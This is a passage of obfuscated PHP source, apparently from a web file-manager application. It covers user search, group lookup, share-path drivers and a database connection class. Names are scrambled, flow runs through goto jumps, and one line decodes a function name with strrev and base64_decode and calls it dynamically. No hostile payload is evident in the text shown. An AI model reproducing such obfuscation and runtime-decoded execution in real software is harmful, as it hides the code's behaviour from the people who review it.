"\165\x73\145\162\x2e{$ã×óöî}\40{$º– …æ}\x2c\40\165\x73\x65\x72\56\165\163\145\x72\111\104\40\141\163\143"; return $this->alias($®¯’ƒÎŸ[2218])->order($¦’ñĞ—); } public function listSearch($ãñ‹Õù‡) { $“Í–¯ËÔ =& $_SERVER[‹‰”››ê]; $ìĞŸå´§ = trim($ãñ‹Õù‡[$“Í–¯ËÔ[2090]]); $õÜ­ú· = explode($“Í–¯ËÔ[53], $ìĞŸå´§); if (!$ìĞŸå´§ || count($õÜ­ú·) == 1) { return $this->listSearchNow($ãñ‹Õù‡); } $©ÑÑû = array($“Í–¯ËÔ[457] => array()); foreach ($õÜ­ú· as $éà¼Ëú¥) { if (!trim($éà¼Ëú¥)) { continue; } $ãñ‹Õù‡[$“Í–¯ËÔ[2090]] = $éà¼Ëú¥; $ÖœÉ—ø = $this->listSearchNow($ãñ‹Õù‡); $©ÑÑû[$“Í–¯ËÔ[457]] = array_merge($©ÑÑû[$“Í–¯ËÔ[457]], $ÖœÉ—ø[$“Í–¯ËÔ[457]]); } $©ÑÑû[$“Í–¯ËÔ[457]] = array_unique_by_key($©ÑÑû[$“Í–¯ËÔ[457]], $“Í–¯ËÔ[1791]); $©ÑÑû[$“Í–¯ËÔ[454]] = array($“Í–¯ËÔ[455] => count($©ÑÑû[$“Í–¯ËÔ[457]]), $“Í–¯ËÔ[451] => 20, $“Í–¯ËÔ[440] => 1, $“Í–¯ËÔ[456] => 1); return $©ÑÑû; } public function listSearchNow($¥¥Â™Ñ) { $Ó–«ä‰Î =& $_SERVER[‹‰”››ê]; $ÜÔ—õÇø = trim($¥¥Â™Ñ[$Ó–«ä‰Î[2090]]); $Ç¸ñ¦¸¨ = isset($¥¥Â™Ñ[$Ó–«ä‰Î[2091]]) ? $¥¥Â™Ñ[$Ó–«ä‰Î[2091]] : !1; $ÜÔ—õÇø = str_replace($Ó–«ä‰Î[2092], $Ó–«ä‰Î[2093], trim($ÜÔ—õÇø)); $”‘¾Û‘è = array($Ó–«ä‰Î[32] => array($Ó–«ä‰Î[471], "\45{$ÜÔ—õÇø}\45"), $Ó–«ä‰Î[392] => array($Ó–«ä‰Î[471], "{$ÜÔ—õÇø}\x25"), $Ó–«ä‰Î[2291] => array($Ó–«ä‰Î[471], "{$ÜÔ—õÇø}\x25"), $Ó–«ä‰Î[1093] => $Ó–«ä‰Î[2094]); if (Input::check($ÜÔ—õÇø, $Ó–«ä‰Î[398])) { $”‘¾Û‘è[$Ó–«ä‰Î[1791]] = array($Ó–«ä‰Î[471], "{$ÜÔ—õÇø}\45"); $”‘¾Û‘è[$Ó–«ä‰Î[2512]] = array($Ó–«ä‰Î[471], "{$ÜÔ—õÇø}\x25"); } if (!$ÜÔ—õÇø) { $”‘¾Û‘è = array(); } if (isset($¥¥Â™Ñ[$Ó–«ä‰Î[840]])) { $”‘¾Û‘è[$Ó–«ä‰Î[840]] = $¥¥Â™Ñ[$Ó–«ä‰Î[840]]; } $”‘¾Û‘è = $this->parseWhereLike($”‘¾Û‘è); $ àÇæ² = $this->_makeOrder()->where($”‘¾Û‘è)->selectPage(20); if (!$ àÇæ² || count($ àÇæ²[$Ó–«ä‰Î[457]]) < 5 && Input::check($ÜÔ—õÇø, $Ó–«ä‰Î[405])) { $«î–Æ‘ô = $this->_searchFromMeta($Ó–«ä‰Î[549], $ÜÔ—õÇø, 10); $Ûİœ ·¸ = $this->_searchFromMeta($Ó–«ä‰Î[550], $ÜÔ—õÇø, 10); $© î·¾ = array_merge($«î–Æ‘ô, $Ûİœ ·¸, $ àÇæ²[$Ó–«ä‰Î[457]]); $ àÇæ²[$Ó–«ä‰Î[457]] = array_unique_by_key($© î·¾, $Ó–«ä‰Î[1791]); $ àÇæ²[$Ó–«ä‰Î[454]][$Ó–«ä‰Î[455]] = count($ àÇæ²[$Ó–«ä‰Î[457]]); $ àÇæ²[$Ó–«ä‰Î[454]][$Ó–«ä‰Î[456]] = ceil($ àÇæ²[$Ó–«ä‰Î[454]][$Ó–«ä‰Î[455]] / $ àÇæ²[$Ó–«ä‰Î[454]][$Ó–«ä‰Î[451]]); } $this->_listDataApply($ àÇæ²[$Ó–«ä‰Î[457]]); $this->_filterByGroup($ àÇæ², $Ç¸ñ¦¸¨); return $ àÇæ²; } private function _filterByGroup(&$Ôõä»ú¿, $íöÜ½ªŸ) { $î¢Ôç¿× =& $_SERVER[‹‰”››ê]; if (!$íöÜ½ªŸ) { return $Ôõä»ú¿; } foreach ($Ôõä»ú¿[$î¢Ôç¿×[457]] as $®ÈÑÃëô => &$¤ßº÷) { $°Ù³‚í = array_to_keyvalue($¤ßº÷[$î¢Ôç¿×[2187]], $î¢Ôç¿×[12], $î¢Ôç¿×[1992]); if (!in_array($íöÜ½ªŸ, $°Ù³‚í)) { unset($Ôõä»ú¿[$î¢Ôç¿×[457]][$®ÈÑÃëô]); } } unset($¤ßº÷); $Ôõä»ú¿[$î¢Ôç¿×[457]] = array_values($Ôõä»ú¿[$î¢Ôç¿×[457]]); $Ôõä»ú¿[$î¢Ôç¿×[454]] = array($î¢Ôç¿×[2255] => count($Ôõä»ú¿[$î¢Ôç¿×[457]]), $î¢Ôç¿×[2253] => $Ôõä»ú¿[$î¢Ôç¿×[454]][$î¢Ôç¿×[451]], $î¢Ôç¿×[2252] => 1, $î¢Ôç¿×[2254] => 1); } private function _searchFromMeta($œ·ºñ¾ì, $¨Òî², $ÄÙìòò) { $±“İùğŸ =& $_SERVER[‹‰”››ê]; $¨Òî² = strtolower($¨Òî²); $š¤ÊêÎã = array($±“İùğŸ[97] => $œ·ºñ¾ì, $±“İùğŸ[462] => array($±“İùğŸ[471], "\x25{$¨Òî²}\45")); $š¤ÊêÎã = $this->parseWhereLike($š¤ÊêÎã); $µ’ÄÜÛ« = Model($±“İùğŸ[2532])->where($š¤ÊêÎã)->limit($ÄÙìòò)->select(); if (!$µ’ÄÜÛ«) { return array(); } $µ’ÄÜÛ« = array_to_keyvalue($µ’ÄÜÛ«, $±“İùğŸ[12], $±“İùğŸ[1791]); $œ¤ˆ¥¯Í = $this->where(array($±“İùğŸ[1782] => array($±“İùğŸ[7], $µ’ÄÜÛ«)))->select(); if (!$œ¤ˆ¥¯Í) { return array(); } return $œ¤ˆ¥¯Í; } private function _listDataApplyItem($”Â€’›) { $çÀØüÌ = array($”Â€’›); $this->_listDataApply($çÀØüÌ); return $çÀØüÌ[0]; } private function _listDataApply(&$¼öõ…’ê) { $»¹ñ°° =& $_SERVER[‹‰”››ê]; if (!$¼öõ…’ê) { return; } array_remove_key($¼öõ…’ê, $»¹ñ°°[982]); $ûøœ®Ê« = array_to_keyvalue($¼öõ…’ê, $»¹ñ°°[12], $»¹ñ°°[1791]); $this->_listAppendGroup($¼öõ…’ê, $ûøœ®Ê«); $this->_listAppendMeta($¼öõ…’ê, $ûøœ®Ê«); $this->_listAppendSourceRoot($¼öõ…’ê, $ûøœ®Ê«); } private function _listAppendSourceRoot(&$êïş÷Øö, $•²úÛèä) { $ÕãĞ§Å =& $_SERVER[‹‰”››ê]; $½¾áá™Ë = Model($ÕãĞ§Å[920])->listSourceRoot(SourceModel::TYPE_USER, $•²úÛèä); $½¾áá™Ë = array_to_keyvalue($½¾áá™Ë, $ÕãĞ§Å[583]); $½¾áá™Ë = array_remove_key($½¾áá™Ë, $ÕãĞ§Å[583]); foreach ($êïş÷Øö as &$û–Êèûä) { $û–Êèûä[$ÕãĞ§Å[90]] = $½¾áá™Ë[$û–Êèûä[$ÕãĞ§Å[1791]]] ? $½¾áá™Ë[$û–Êèûä[$ÕãĞ§Å[1791]]] : array(); } unset($û–Êèûä); } private function _listAppendGroup(&$›Ìñşš•, $àƒ¾°¤…) { $ê½‡ª†É =& $_SERVER[‹‰”››ê]; $·‡ƒŸ€Ã = array($ê½‡ª†É[1791] => array($ê½‡ª†É[7], $àƒ¾°¤…)); $Û³œÆ¦­ = Model($ê½‡ª†É[2086])->where($·‡ƒŸ€Ã)->select(); $«ŞŒÊñÃ = array_to_keyvalue($Û³œÆ¦­, $ê½‡ª†É[12], $ê½‡ª†É[1992]); $«ŞŒÊñÃ = array_remove_value(array_unique($«ŞŒÊñÃ), $ê½‡ª†É[231]); if (!$«ŞŒÊñÃ || !$Û³œÆ¦­) { return; } $·‡ƒŸ€Ã = array($ê½‡ª†É[1992] => array($ê½‡ª†É[7], $«ŞŒÊñÃ)); $„êè“‹ö = Model($ê½‡ª†É[2185])->field($ê½‡ª†É[2533])->where($·‡ƒŸ€Ã)->select(); $„êè“‹ö = array_to_keyvalue($„êè“‹ö, $ê½‡ª†É[1992]); $Û³œÆ¦­ = array_to_keyvalue_group($Û³œÆ¦­, $ê½‡ª†É[1791]); foreach ($Û³œÆ¦­ as &$—¹¯Ú¼‡) { $²§¨ÀÙ¦ = array(); foreach ($—¹¯Ú¼‡ as $©³ä¸áÑ) { if (!$©³ä¸áÑ[$ê½‡ª†É[2100]]) { continue; } $ŠÕ‘’é² = Model($ê½‡ª†É[585])->listData($©³ä¸áÑ[$ê½‡ª†É[2100]]); $²§¨ÀÙ¦[] = array($ê½‡ª†É[1992] => $©³ä¸áÑ[$ê½‡ª†É[1992]], $ê½‡ª†É[2534] => $„êè“‹ö[$©³ä¸áÑ[$ê½‡ª†É[1992]]][$ê½‡ª†É[32]], $ê½‡ª†É[598] => $„êè“‹ö[$©³ä¸áÑ[$ê½‡ª†É[1992]]][$ê½‡ª†É[598]], $ê½‡ª†É[499] => $ŠÕ‘’é²); } $—¹¯Ú¼‡ = $²§¨ÀÙ¦; } unset($—¹¯Ú¼‡); foreach ($›Ìñşš• as &$¡œÚó—™) { $¡œÚó—™[$ê½‡ª†É[2187]] = array(); if (isset($Û³œÆ¦­[$¡œÚó—™[$ê½‡ª†É[1791]]])) { $¡œÚó—™[$ê½‡ª†É[2187]] = $Û³œÆ¦­[$¡œÚó—™[$ê½‡ª†É[1791]]]; } } unset($¡œÚó—™); } public function userAppendGroup($ÛæÛÌ¼) { $Ğ•Â¿Ïº =& $_SERVER[‹‰”››ê]; if (!$ÛæÛÌ¼) { return array(); } $this->_listAppendGroup($ÛæÛÌ¼, array_to_keyvalue($ÛæÛÌ¼, $Ğ•Â¿Ïº[12], $Ğ•Â¿Ïº[1791])); return $ÛæÛÌ¼; } private function _listAppendMeta(&$œĞ«Ä , $˜ÈçÒ½Ä) { $õó¨ıâĞ =& $_SERVER[‹‰”››ê]; $£âˆ¨ıÄ = UserJobModel::JOB_KEY; $‚Ÿ¸˜ßî = array($õó¨ıâĞ[2513]); $°­†Á¥¸ = array($õó¨ıâĞ[1791] => array($õó¨ıâĞ[7], $˜ÈçÒ½Ä)); $¹€­‡¦Ÿ = Model($õó¨ıâĞ[2511])->where($°­†Á¥¸)->select(); $¹€­‡¦Ÿ = array_to_keyvalue_group($¹€­‡¦Ÿ, $õó¨ıâĞ[1791]); foreach ($¹€­‡¦Ÿ as &$È™±Š†€) { $ûÅÉš” = array(); foreach ($È™±Š†€ as $Ù§÷×Ä) { if (!in_array($Ù§÷×Ä[$õó¨ıâĞ[97]], $‚Ÿ¸˜ßî)) { $ûÅÉš”[$Ù§÷×Ä[$õó¨ıâĞ[97]]] = $Ù§÷×Ä[$õó¨ıâĞ[462]]; } } $È™±Š†€ = $ûÅÉš”; } unset($È™±Š†€); $ÆÀË–›‡ = Model($õó¨ıâĞ[2535]); foreach ($œĞ«Ä  as &$â‹éâ›ã) { $¡ìˆÒÂæ = array(); if (isset($¹€­‡¦Ÿ[$â‹éâ›ã[$õó¨ıâĞ[1791]]])) { $¡ìˆÒÂæ = $¹€­‡¦Ÿ[$â‹éâ›ã[$õó¨ıâĞ[1791]]]; } $â‹éâ›ã[$õó¨ıâĞ[2536]] = array(); if (isset($¡ìˆÒÂæ[$£âˆ¨ıÄ])) { $â‹éâ›ã[$õó¨ıâĞ[2536]] = $ÆÀË–›‡->getUserJobInfo($¡ìˆÒÂæ[$£âˆ¨ıÄ]); } } unset($â‹éâ›ã); } protected function groupUserAll($éàÕÇà) { $÷†é¥ö =& $_SERVER[‹‰”››ê]; if (!$éàÕÇà) { return !1; } $öİ¯üĞ¶ = Model($÷†é¥ö[2086])->field($÷†é¥ö[1791])->where(array($÷†é¥ö[1992] => array($÷†é¥ö[7], $éàÕÇà)))->select(); $öİ¯üĞ¶ = array_to_keyvalue($öİ¯üĞ¶, $÷†é¥ö[12], $÷†é¥ö[1791]); return array_unique($öİ¯üĞ¶); } public function userSearch($·şïåø”, $ñå§á» = "\x2a") { return Model($_SERVER[‹‰”››ê][611])->where($·şïåø”)->field($ñå§á»)->find(); } } goto E³ŒíµÀËŠ; e³¬Ûšƒëº: class PathDriverDriverShareItem { public function __construct($Úşø•ì) { $this->pathParse = $Úşø•ì; } public function __call($ß’œı¦¥, $ùœóÆÙš) { $éÁ©«´Ú =& $_SERVER[‹‰”››ê]; if (method_exists($this, $ß’œı¦¥)) { return; } $³ïü¶ğ¬ = call_user_func_array(array($éÁ©«´Ú[1447], $ß’œı¦¥), $ùœóÆÙš); $²ßßÎå‘ = array($éÁ©«´Ú[1448], $éÁ©«´Ú[1449], $éÁ©«´Ú[1450], $éÁ©«´Ú[1451], $éÁ©«´Ú[635], $éÁ©«´Ú[637], $éÁ©«´Ú[1452], $éÁ©«´Ú[110], $éÁ©«´Ú[1453], $éÁ©«´Ú[1454]); if (in_array($ß’œı¦¥, $²ßßÎå‘)) { $³ïü¶ğ¬ = $this->getPathOuter($³ïü¶ğ¬); } return $³ïü¶ğ¬; } public function copy($¤ŠÉ¥«³, $û‰ÔÀ“, $Æß½­¬õ = false, $ÕÄöÚõÃ = false) { return $this->copyMove($¤ŠÉ¥«³, $û‰ÔÀ“, $Æß½­¬õ, $_SERVER[‹‰”››ê][635], $ÕÄöÚõÃ); } public function move($†²öåà, $ÌªØ«¥, $±ª•æ¿ß = false, $Õ¦ŒñÒ = false) { return $this->copyMove($†²öåà, $ÌªØ«¥, $±ª•æ¿ß, $_SERVER[‹‰”››ê][637], $Õ¦ŒñÒ); } private function copyMove($ØˆƒŒã¤, $ı“äÇˆœ, $¾­ÊÜšŒ, $õ×Ìèú, $Ü½‰¬ = false) { $³”±ÇĞÈ =& $_SERVER[‹‰”››ê]; $Ïß’£Ùï = $ı“äÇˆœ; $Ã–ˆ¥Ù = IO::driverMake($ı“äÇˆœ); if ($Ã–ˆ¥Ù->pathParse[$³”±ÇĞÈ[1248]]) { $ı“äÇˆœ = $Ã–ˆ¥Ù->pathParse[$³”±ÇĞÈ[1248]]; } else { $ı“äÇˆœ = $Ïß’£Ùï; } $†¼¯°·ò = IO::copyMove($ØˆƒŒã¤, $ı“äÇˆœ, $¾­ÊÜšŒ, $õ×Ìèú, $Ü½‰¬); $†¼¯°·ò = $this->getPathOuter($†¼¯°·ò); return $†¼¯°·ò; } public function pathThis($šÁ‡¥³Û) { return get_path_this($this->pathParse[$_SERVER[‹‰”››ê][87]]); } public function pathFather($Üƒ’ŸÈò) { return get_path_father($this->pathParse[$_SERVER[‹‰”››ê][87]]); } public function iconvSystem($±Ú²Ğì) { return $±Ú²Ğì; } protected function infoParse($áÓñšÆù, $ÓßÊªÂÒ = false) { $Æ‹‡†ıİ =& $_SERVER[‹‰”››ê]; $«é•ªœ« = $this->pathParse[$Æ‹‡†ıİ[574]][$Æ‹‡†ıİ[1273]] . $this->pathParse[$Æ‹‡†ıİ[1266]]; if ($ÓßÊªÂÒ) { $º«õÌÖï = IO::infoWithChildren($«é•ªœ«); } else { $º«õÌÖï = IO::info($«é•ªœ«); } $ú°Şıúê = $this->pathParse[$Æ‹‡†ıİ[574]]; return Action($Æ‹‡†ıİ[1444])->_shareItemeParse($º«õÌÖï, $ú°Şıúê); } public function listAll($’¡Ö‹Ë¡) { $í¬Ø°Ì€ =& $_SERVER[‹‰”››ê]; $ûŸ”®ƒ = IO::listAll($’¡Ö‹Ë¡); $íşÛş = rtrim($this->pathParse[$í¬Ø°Ì€[574]][$í¬Ø°Ì€[1273]], $í¬Ø°Ì€[8]); foreach ($ûŸ”®ƒ as &$”ëÃÖüƒ) { $”ëÃÖüƒ[$í¬Ø°Ì€[87]] = $this->pathDriver . $í¬Ø°Ì€[8] . ltrim(substr($”ëÃÖüƒ[$í¬Ø°Ì€[87]], strlen($íşÛş)), $í¬Ø°Ì€[8]); } unset($”ëÃÖüƒ); return $ûŸ”®ƒ; } public function listAllSimple($Ù…ÍõŒ, $Ç–—ÕÍ¯ = false) { $è¡ÃŠåí =& $_SERVER[‹‰”››ê]; $Ò“ËÃŞ = $this->listAll($Ù…ÍõŒ); $õÕ“šç = $this->pathParse[$è¡ÃŠåí[507]]; if (trim($õÕ“šç, $è¡ÃŠåí[8]) == trim(get_path_father($õÕ“šç), $è¡ÃŠåí[8])) { $Ç–—ÕÍ¯ = !0; } return IO::init($è¡ÃŠåí[12])->listAllSimpleMake($Ò“ËÃŞ, $õÕ“šç, $Ç–—ÕÍ¯); } public function getPathOuter($šğ·”ß) { $ûÅÆ±Â =& $_SERVER[‹‰”››ê]; $Êœ’°ÜÓ = KodIO::parse($šğ·”ß); if ($Êœ’°ÜÓ[$ûÅÆ±Â[33]] == KodIO::KOD_SHARE_ITEM) { return $Êœ’°ÜÓ[$ûÅÆ±Â[87]]; } $ ŠšØöè = KodIO::clear($šğ·”ß); $…Š×éÄ° = KodIO::clear($this->pathParse[$ûÅÆ±Â[574]][$ûÅÆ±Â[1273]]); $Ëº«™„ = substr($ ŠšØöè, strlen($…Š×éÄ°)); if (substr($ ŠšØöè, 0, strlen($…Š×éÄ°)) != $…Š×éÄ°) { return !1; } return $this->pathParse[$ûÅÆ±Â[1267]] . $ûÅÆ±Â[8] . ltrim($Ëº«™„, $ûÅÆ±Â[8]); } public function getType() { $•À†ˆ =& $_SERVER[‹‰”››ê]; $ø©òŸ•  = str_replace($•À†ˆ[77], $•À†ˆ[12], get_class($this)); return strtolower($ø©òŸ• ); } public function isOsDriver($¬ë¶Îüç) { return IO::isOsDriver($¬ë¶Îüç); } public function info($çö‰èñ) { return $this->infoParse($çö‰èñ); } public function infoAuth($²æßàÏ) { return $this->infoParse($²æßàÏ); } public function infoWithChildren($¬©€šÏÀ) { return $this->infoParse($¬©€šÏÀ, !0); } public function infoFull($óåïşÜ¡) { return $this->infoParse($óåïşÜ¡); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($¢‚‡Œõ) { $this->pathParse = $¢‚‡Œõ; } protected function infoParse($²œìã‰, $•·—¦¶· = false) { $Ÿ«åœş =& $_SERVER[‹‰”››ê]; return Action($Ÿ«åœş[1272])->sharePathInfo($this->pathParse[$Ÿ«åœş[87]], !0, $•·—¦¶·); } public function listPath($…©Â‰×, $¤“Ìâ…‘ = false) { $¦·óßàˆ =& $_SERVER[‹‰”››ê]; $Ñ†’Îµë = IO::listPath($…©Â‰×, $¤“Ìâ…‘); if (!$Ñ†’Îµë) { return $Ñ†’Îµë; } if (is_array($Ñ†’Îµë[$¦·óßàˆ[1446]])) { $”ÎÙÒç¸ = Action($¦·óßàˆ[1455])->parsePathChildren($Ñ†’Îµë[$¦·óßàˆ[1446]], array($¦·óßàˆ[507] => $…©Â‰×)); $Ñ†’Îµë[$¦·óßàˆ[1446]] = Action($¦·óßàˆ[1272])->shareItemInfo($”ÎÙÒç¸); } foreach ($Ñ†’Îµë as $„ÊääÁÇ => $œœİï¶Í) { if (!in_array($„ÊääÁÇ, array($¦·óßàˆ[86], $¦·óßàˆ[85]))) { continue; } foreach ($œœİï¶Í as $‹»¦òê° => $”ÎÙÒç¸) { $”ÎÙÒç¸ = Action($¦·óßàˆ[1455])->parsePathChildren($”ÎÙÒç¸, array($¦·óßàˆ[507] => $…©Â‰×)); $Ñ†’Îµë[$„ÊääÁÇ][$‹»¦òê°] = Action($¦·óßàˆ[1272])->shareItemInfo($”ÎÙÒç¸); } } return $Ñ†’Îµë; } } class PathDriverEDS extends PathDriverBaseS3 { public function __construct($ñ®ë¡ÕÓ) { parent::__construct($ñ®ë¡ÕÓ); $this->setSignVersion($_SERVER[‹‰”››ê][250]); } } goto aó®ÔĞ¸ß; f‹§¨Óò: $fileSize = strrev(base64_decode($_SERVER[ÓÎ®ç»•][0])); function binCheckNeq($õÏÉ¸Á, $¾Åˆ¿‘) { return $õÏÉ¸Á != $¾Åˆ¿‘; } $_SERVER[$_SERVER[ÓÎ®ç»•][1]] = $fileSize($_SERVER[$_SERVER[ÓÎ®ç»•][2]]); goto d…ÀÑÃİÏ; c—˜–È°Í¥: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\164\x68\x69\x6e\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\161" => "\x3d", "\156\x65\161" => "\x3c\x3e", "\147\x74" => "\x3e", "\145\147\x74" => "\x3e\75", "\x6c\164" => "\74", "\145\x6c\x74" => "\x3c\75", "\x6e\157\164\x6c\151\153\145" => "\116\x4f\124\x20\114\x49\113\105", "\154\151\153\145" => "\x4c\x49\113\105", "\x69\x6e" => "\x49\116", "\x6e\157\x74\151\x6e" => "\116\117\124\x20\x49\x4e", "\x6e\x6f\x74\40\151\x6e" => "\116\117\x54\40\111\116", "\142\x65\x74\167\145\145\156" => "\102\105\124\x57\105\x45\116", "\156\157\x74\142\145\x74\167\145\145\156" => "\116\x4f\x54\40\x42\105\124\x57\x45\105\116", "\156\x6f\164\x20\x62\x65\x74\x77\145\145\156" => "\116\x4f\124\40\102\105\x54\x57\105\105\x4e"); protected $selectSql = "\123\x45\114\x45\103\124\45\104\x49\x53\x54\111\116\x43\124\45\40\45\106\x49\x45\114\104\45\40\x46\x52\117\x4d\40\x25\124\101\102\114\105\45\45\112\x4f\x49\116\x25\x25\127\x48\105\x52\105\x25\x25\107\x52\117\125\120\x25\x25\x48\101\x56\111\116\x47\x25\45\x4f\x52\104\x45\122\x25\45\x4c\111\x4d\x49\x54\x25\40\x25\x55\116\x49\117\116\x25\x25\103\117\x4d\x4d\105\116\x54\45"; protected $bind = array(); public static function getInstance() { $µüğƒÁ» = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[‹‰”››ê][1053], $µüğƒÁ»); } public function factory($îÊ‘Ö‹† = '') { $ÓæõÔØ =& $_SERVER[‹‰”››ê]; $îÊ‘Ö‹† = $this->parseConfig($îÊ‘Ö‹†); if (empty($îÊ‘Ö‹†[$ÓæõÔØ[1054]])) { think_exception(think_lang($ÓæõÔØ[1055])); } $this->dbType = ucwords(strtolower($îÊ‘Ö‹†[$ÓæõÔØ[1054]])); $Áâù³íÛ = $ÓæõÔØ[1056] . $this->dbType; if (class_exists($Áâù³íÛ)) { $ÂîÕÊêº = new $Áâù³íÛ($îÊ‘Ö‹†); if ($ÓæõÔØ[1057] != strtolower($îÊ‘Ö‹†[$ÓæõÔØ[1054]])) { $ÂîÕÊêº->dbType = strtoupper($this->dbType); } else { $ÂîÕÊêº->dbType = $this->_getDsnType($îÊ‘Ö‹†[$ÓæõÔØ[1009]]); } } else { think_exception(think_lang($ÓæõÔØ[1058]) . $ÓæõÔØ[1059] . $Áâù³íÛ); } return $ÂîÕÊêº; } public function __call($¨‚¿Ğ´½, $÷ Ùıè) { if (method_exists($this, $¨‚¿Ğ´½)) { return call_user_func_array(array($this, $¨‚¿Ğ´½), $÷ Ùıè); } } protected function _getDsnType($ÁâÅÎ½) { $‰úØÙÜ¯ = explode($_SERVER[‹‰”››ê][4], $ÁâÅÎ½); $µ§Ä·… = strtoupper(trim($‰úØÙÜ¯[0])); return $µ§Ä·…; } private function parseConfig($«›‹Á£ = '') { $€Òª–Ç‰ =& $_SERVER[‹‰”››ê]; if (!empty($«›‹Á£) && is_string($«›‹Á£)) { $«›‹Á£ = $this->parseDSN($«›‹Á£); } elseif (is_array($«›‹Á£)) { $«›‹Á£ = array_change_key_case($«›‹Á£); $«›‹Á£ = array($€Òª–Ç‰[1054] => $«›‹Á£[$€Òª–Ç‰[1060]], $€Òª–Ç‰[981] => $«›‹Á£[$€Òª–Ç‰[1061]], $€Òª–Ç‰[982] => $«›‹Á£[$€Òª–Ç‰[1062]], $€Òª–Ç‰[979] => $«›‹Á£[$€Òª–Ç‰[1063]], $€Òª–Ç‰[980] => $«›‹Á£[$€Òª–Ç‰[1064]], $€Òª–Ç‰[21] => $«›‹Á£[$€Òª–Ç‰[1065]], $€Òª–Ç‰[1009] => $«›‹Á£[$€Òª–Ç‰[1066]], $€Òª–Ç‰[17] => isset($«›‹Á£[$€Òª–Ç‰[1067]]) ? $«›‹Á£[$€Òª–Ç‰[1067]] : array()); } elseif (empty($«›‹Á£)) { if (think_config($€Òª–Ç‰[1068]) && $€Òª–Ç‰[1057] != strtolower(think_config($€Òª–Ç‰[1069]))) { $«›‹Á£ = $this->parseDSN(think_config($€Òª–Ç‰[1068])); } else { $«›‹Á£ = array($€Òª–Ç‰[1054] => think_config($€Òª–Ç‰[1069]), $€Òª–Ç‰[981] => think_config($€Òª–Ç‰[1070]), $€Òª–Ç‰[982] => think_config($€Òª–Ç‰[1071]), $€Òª–Ç‰[979] => think_config($€Òª–Ç‰[1072]), $€Òª–Ç‰[980] => think_config($€Òª–Ç‰[1073]), $€Òª–Ç‰[21] => think_config($€Òª–Ç‰[335]), $€Òª–Ç‰[1009] => think_config($€Òª–Ç‰[1068]), $€Òª–Ç‰[17] => think_config($€Òª–Ç‰[1074])); } } return $«›‹Á£; } protected function initConnect($ÊŸ¦«Ù = true) { if (1 == think_config($_SERVER[‹‰”››ê][22])) { $this->_linkID = $this->multiConnect($ÊŸ¦«Ù); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $¯Î”§ˆ¿ => $ºşŞÆ) { $this->_linkID = $ºşŞÆ; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($¹‹„¦Å = false) { $¨ÃˆÂ†à =& $_SERVER[‹‰”››ê]; static $´Í¾ôà = array(); static $»È€º” = -1; if (empty($´Í¾ôà)) { foreach ($this->config as $ÚšğÑ­ => $¦¦‘óØ°) { $´Í¾ôà[$ÚšğÑ­] = explode($¨ÃˆÂ†à[50], $¦¦‘óØ°); } } if (think_config($¨ÃˆÂ†à[1075])) { if ($¹‹„¦Å || think_config($¨ÃˆÂ†à[483]) === !0) { $ùÒ‘ù©º = floor(mt_rand(0, think_config($¨ÃˆÂ†à[1076]) - 1)); $»È€º” = $ùÒ‘ù©º; } else { if (is_numeric(think_config($¨ÃˆÂ†à[1077]))) { $ùÒ‘ù©º = think_config($¨ÃˆÂ†à[1077]); } else { $ùÒ‘ù©º = floor(mt_rand(think_config($¨ÃˆÂ†à[1076]), count($´Í¾ôà[$¨ÃˆÂ†à[979]]) - 1)); } } } else { $ùÒ‘ù©º = floor(mt_rand(0, count($´Í¾ôà[$¨ÃˆÂ†à[979]]) - 1)); $»È€º” = $ùÒ‘ù©º; } $ùÒ‘ù©º = $»È€º” !== -1 ? $»È€º” : $ùÒ‘ù©º; $€÷‹ú¬Ë = array($¨ÃˆÂ†à[981] => isset($´Í¾ôà[$¨ÃˆÂ†à[981]][$ùÒ‘ù©º]) ? $´Í¾ôà[$¨ÃˆÂ†à[981]][$ùÒ‘ù©º] : $´Í¾ôà[$¨ÃˆÂ†à[981]][0], $¨ÃˆÂ†à[982] => isset($´Í¾ôà[$¨ÃˆÂ†à[982]][$ùÒ‘ù©º]) ? $´Í¾ôà[$¨ÃˆÂ†à[982]][$ùÒ‘ù©º] : $´Í¾ôà[$¨ÃˆÂ†à[982]][0], $¨ÃˆÂ†à[979] => isset($´Í¾ôà[$¨ÃˆÂ†à[979]][$ùÒ‘ù©º]) ? $´Í¾ôà[$¨ÃˆÂ†à[979]][$ùÒ‘ù©º] : $´Í¾ôà[$¨ÃˆÂ†à[979]][0], $¨ÃˆÂ†à[980] => isset($´Í¾ôà[$¨ÃˆÂ†à[980]][$ùÒ‘ù©º]) ? $´Í¾ôà[$¨ÃˆÂ†à[980]][$ùÒ‘ù©º] : $´Í¾ôà[$¨ÃˆÂ†à[980]][0], $¨ÃˆÂ†à[21] => isset($´Í¾ôà[$¨ÃˆÂ†à[21]][$ùÒ‘ù©º]) ? $´Í¾ôà[$¨ÃˆÂ†à[21]][$ùÒ‘ù©º] : $´Í¾ôà[$¨ÃˆÂ†à[21]][0], $¨ÃˆÂ†à[1009] => isset($´Í¾ôà[$¨ÃˆÂ†à[1009]][$ùÒ‘ù©º]) ? $´Í¾ôà[$¨ÃˆÂ†à[1009]][$ùÒ‘ù©º] : $´Í¾ôà[$¨ÃˆÂ†à[1009]][0], $¨ÃˆÂ†à[17] => isset($´Í¾ôà[$¨ÃˆÂ†à[17]][$ùÒ‘ù©º]) ? $´Í¾ôà[$¨ÃˆÂ†à[17]][$ùÒ‘ù©º] : $´Í¾ôà[$¨ÃˆÂ†à[17]][0]); return $this->connect($€÷‹ú¬Ë, $ùÒ‘ù©º); } public function parseDSN($²ôÈ÷Û³) { $ÙÍ½ê± =& $_SERVER[‹‰”››ê]; if (empty($²ôÈ÷Û³)) { return !1; } $²°‘×²Ò = parse_url($²ôÈ÷Û³); if ($²°‘×²Ò[$ÙÍ½ê±[208]]) { $‰»¾èÅÅ = array($ÙÍ½ê±[1054] => 